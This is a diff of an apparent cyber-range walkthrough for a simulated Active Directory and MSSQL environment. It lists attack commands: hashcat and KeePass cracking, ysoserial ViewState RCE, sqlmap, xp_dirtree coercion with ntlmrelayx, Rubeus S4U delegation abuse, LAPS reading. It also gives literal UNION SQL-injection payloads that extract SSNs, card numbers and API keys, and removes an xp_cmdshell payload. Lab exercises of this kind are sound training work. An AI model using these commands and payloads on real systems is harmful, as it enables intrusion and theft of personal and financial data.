@@ -29,7 +29,7 @@ IPs assume range number 3 (`10.3.<vlan>.<octet>`). Names resolve via the range r
 | 4.4 | Kali | `keepass2john passwords.kdbx | hashcat -m 13400` | cracks → OSCAR web-app creds |
 | 5.1 | Kali | `badsecrets`/Blacklist3r flags leaked machineKey → `ysoserial.net -p ViewState ...` | RCE on OSCAR-WEB |
 | 5.2 | Kali | `sqlmap -r req.txt -p q --dbms mssql --batch` | SQLi confirmed on OSCAR-DB |
-| 5.3 | Kali | `sqlmap ... --os-shell` (xp_cmdshell) OR `xp_dirtree \\kali\x` → ntlmrelayx | OS exec as svc_mssql (relay or fallback) |
+| 5.3 | Kali | SQLi → `xp_dirtree \\kali\x` coerces svc_mssql's SMB auth → `ntlmrelayx` relays it | OS exec via the relayed session (the intended path; xp_cmdshell is disabled, no os-shell shortcut) |
 | 5.4 | Kali | `Get-ADUser svc_mssql -Properties msDS-AllowedToDelegateTo` / BloodHound | constrained delegation visible |
 | 5.5 | Kali | `Rubeus.exe s4u /user:svc_mssql /rc4:.. /impersonateuser:oscaradmin /msdsspn:cifs/operator-ws1.oscar.local /ptt` | impersonation TGS obtained |
 | 5.6 | Kali | `nxc ldap 10.3.40.10 -M laps` (as delegated principal) | reads OPERATOR-WS1 LAPS pw → local admin |
@@ -47,7 +47,9 @@ IPs assume range number 3 (`10.3.<vlan>.<octet>`). Names resolve via the range r
 
 - 9.1/9.2 (outer, 3-col UNION): `%' UNION SELECT SecretId, SSN+'|'+CreditCardNumber, ApiKey FROM dbo.CustomerSecrets -- `
 - 9.3/9.4 (nested inner proc, 2-col UNION): `x' UNION SELECT CustomerId, SSN+'|'+CreditCardNumber+'|'+ApiKey FROM dbo.CustomerSecrets -- `
-- SQLi→RCE (stacked, sysadmin): `%'; EXEC xp_cmdshell 'whoami'; -- `
+
+M9 is data exfiltration only — `xp_cmdshell` is disabled on ALPHA-SECRETS, so there is no
+SQLi→RCE shortcut; the crown jewels are recovered purely via the layered UNION/stored-proc SQLi.
 
 ## End-to-end (Mythic) run
 
